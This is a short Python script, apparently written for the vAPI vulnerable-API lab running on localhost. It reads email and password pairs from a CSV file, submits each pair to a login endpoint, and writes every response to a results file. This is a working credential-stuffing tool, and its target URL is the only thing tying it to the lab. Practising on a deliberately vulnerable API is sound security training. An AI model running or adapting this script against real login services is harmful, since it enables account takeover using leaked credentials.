import requests, csv

# Testing on self-hosted vulnerable API: https://github.com/roottusk/vapi
url = 'http://127.0.0.1/vapi/api2/user/login'

def login(email, password):
    payload = {'email': email.rstrip(),'password': password.rstrip()}
    response = requests.post(url, json=payload)
    return response


# Creating credentials tuple from csv
with open('creds.csv', newline='') as f:
    reader = csv.reader(f)
    credentials = [tuple(row) for row in reader]

'''
# Creating credentials tuple from 2 seperate files
with open('emails.txt', 'r') as f:
    emails = f.readlines()

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

credentials = zip(emails, passwords)
'''

# Saving responses to results.txt
with open('results.txt', 'a') as f:
    for cred in credentials:
        e, p = cred
        response = login(e, p)
        f.write(str(response.status_code) + ' ' + str(response.json()) + '\n')
    f.close()
